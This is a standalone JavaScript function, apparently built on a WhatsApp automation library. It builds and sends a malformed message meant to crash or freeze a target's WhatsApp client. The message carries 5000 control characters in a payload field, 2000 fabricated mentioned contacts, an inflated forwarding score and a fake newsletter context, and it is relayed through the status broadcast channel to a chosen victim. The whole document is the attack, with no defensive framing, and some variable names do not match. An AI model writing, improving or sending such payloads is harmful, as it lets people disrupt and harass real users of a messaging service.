async function BetaTester(empire, mention) {
let mentionList = Array.from({ length:2000 }, 
(_, d) => `1313555000${d + 1}@s.whatsapp.net`);
let msg = await generateWAMessageFromContent(empire, {
viewOnceMessage: {
 message: {
  messageContextInfo: {
   messageSecret: crypto.randomBytes(32)
},
 interactiveResponseMessage: {
  body: {
   text: "Last Teater Empire",
},
nativeFlowResponseMessage: {
 name: "galaxy_message",
  paramsJson: "\u0003".repeat(5000),
   version: 3
},
contextInfo: {
isChannelMessage: true, 
 mentionedJid: mentionedList,
  isForwarded: true,
   forwardingScore: 9999,
    forwardedNewsletterMessageInfo: {
     newsletterName: ".¿",
      newsletterJid: "25002008@newsletter",
       serverMessageId: 1
}
}
}
}
}
}, {});
  
  await Tester.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [empire],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: empire },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Tester.relayMessage(empire, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
             type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "Empire Dilay" },
          content: undefined
        }
      ]
    });
  }
}